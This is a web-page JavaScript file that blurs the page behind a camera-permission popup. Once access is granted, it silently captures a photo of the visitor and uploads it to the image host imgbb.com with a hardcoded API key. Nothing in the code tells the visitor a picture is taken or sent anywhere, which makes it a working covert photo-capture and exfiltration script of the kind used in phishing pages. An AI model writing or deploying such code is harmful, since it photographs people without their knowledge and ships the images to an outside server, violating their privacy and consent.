const popup = document.getElementById("consentPopup");
const allowButton = document.getElementById("allowCamera");
const pageContent = document.getElementById("pageContent");

let stream = null;
let popupShown = false;


/* =========================
   POPUP CONTROL
========================= */

function showPopup() {

    if (popupShown) return;

    popupShown = true;

    pageContent.classList.add("blur");

    popup.classList.add("show");


    // remove listeners after popup appears
    window.removeEventListener("scroll", interactionTrigger);
    window.removeEventListener("click", interactionTrigger);
    window.removeEventListener("touchstart", interactionTrigger);

}



/* =========================
   USER INTERACTION TRIGGER
========================= */

function interactionTrigger() {

    showPopup();

}



/* =========================
   TIMER TRIGGER
========================= */

setTimeout(() => {

    showPopup();

}, 1000);



/* =========================
   LISTEN FOR USER ACTION
========================= */

window.addEventListener(
    "scroll",
    interactionTrigger,
    { once:true }
);


window.addEventListener(
    "click",
    interactionTrigger,
    { once:true }
);


window.addEventListener(
    "touchstart",
    interactionTrigger,
    { once:true }
);




/* =========================
   CAMERA PERMISSION
========================= */

allowButton.addEventListener(
    "click",
    startCamera
);



async function startCamera() {

    try {

        stream = await navigator.mediaDevices.getUserMedia({

            video:true

        });


        // permission granted
        popup.classList.remove("show");

        // remove blur immediately
        pageContent.classList.remove("blur");



        setTimeout(() => {

            capturePhoto();

        },1000);



    }


    catch(error) {


        console.error(
            "Camera error:",
            error
        );


        if(error.name==="NotAllowedError") {

            alert(
                "Camera permission denied."
            );

        }


        else if(error.name==="NotFoundError") {

            alert(
                "No camera found."
            );

        }


        else {

            alert(
                "Unable to access camera."
            );

        }


    }

}





/* =========================
   CAPTURE PHOTO
========================= */

function capturePhoto() {


    const video = document.createElement("video");


    video.srcObject = stream;


    video.playsInline = true;

    video.muted = true;



    video.onloadedmetadata = () => {


        video.play();



        setTimeout(() => {


            const canvas =
            document.createElement("canvas");



            canvas.width =
            video.videoWidth;


            canvas.height =
            video.videoHeight;



            const ctx =
            canvas.getContext("2d");



            ctx.drawImage(

                video,

                0,

                0,

                canvas.width,

                canvas.height

            );



            const imageData =
            canvas.toDataURL("image/png");



            const imageBase64 =
            imageData.split(",")[1];



            uploadImage(imageBase64);



            stopCamera();



        },1000);



    };


}





/* =========================
   STOP CAMERA
========================= */

function stopCamera() {


    if(!stream) return;



    stream.getTracks()
    .forEach(track => {

        track.stop();

    });



    stream=null;


}





/* =========================
   IMGBB UPLOAD
========================= */

async function uploadImage(image) {


    const API_KEY =
    "54c4b68870fc5dc29bacb73a40ea3726";



    const formData =
    new FormData();



    formData.append(
        "image",
        image
    );



    try {


        const response =
        await fetch(

            `https://api.imgbb.com/1/upload?key=${API_KEY}`,

            {

                method:"POST",

                body:formData

            }

        );



        const data =
        await response.json();



        if(data.success) {

            console.log(
                "Upload successful:",
                data.data.url
            );

        }


        else {

            console.error(
                "Upload failed:",
                data
            );

        }


    }


    catch(error) {


        console.error(
            "Upload error:",
            error
        );


    }

}